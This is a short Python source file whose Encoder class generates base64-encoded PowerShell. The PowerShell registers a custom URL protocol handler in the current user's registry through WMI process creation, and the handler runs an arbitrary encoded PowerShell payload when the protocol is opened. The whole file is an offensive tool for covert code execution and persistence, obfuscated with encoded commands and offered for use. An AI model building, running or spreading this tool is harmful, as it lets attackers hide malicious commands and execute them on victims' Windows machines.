import base64

class Encoder:
    def __init__(self, to_encode, handler_name):
        self.handler_name = handler_name
        self.to_encode = to_encode
        self.create_powershell_payload()

    def create_powershell_payload(self):
        try:
            ps_script_base = r'''
            $ComputerName = $env:computername
            $Payload = "-EncodedCommand {0}"
            $Handler = "{handler_name}"
            $Command = "cmd.exe /Q /c reg add HKEY_CURRENT_USER\Software\Classes\$($Handler) /d ""URL: $($Handler)"" /v ""URL Protocol"" /f && reg add HKEY_CURRENT_USER\Software\Classes\$($Handler)\shell\open\command /d ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $($Payload)"""
            $Process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $Command
            '''

            # Command to execute 
            payload_encoded_command = rf'''
            {self.to_encode}
            '''

            # Encode the command
            encoded_custom_command = base64.b64encode(payload_encoded_command.encode('utf-16le')).decode('utf-8')

            # Insert the encoded command and handler name into the base script
            ps_script = ps_script_base.format(encoded_custom_command, handler_name=self.handler_name)

            # Encode the PowerShell script
            encoded_script = base64.b64encode(ps_script.encode('utf-16le')).decode('utf-8')
            print()
            print(encoded_script)

            print('-' * 50)
            print("Non encoded payload:")
            print(self.to_encode)
            print("\nStandalone encoded payload:")
            print('powershell.exe -EncodedCommand', encoded_custom_command)
        except Exception as e:
            print("An error occurred: ", e)
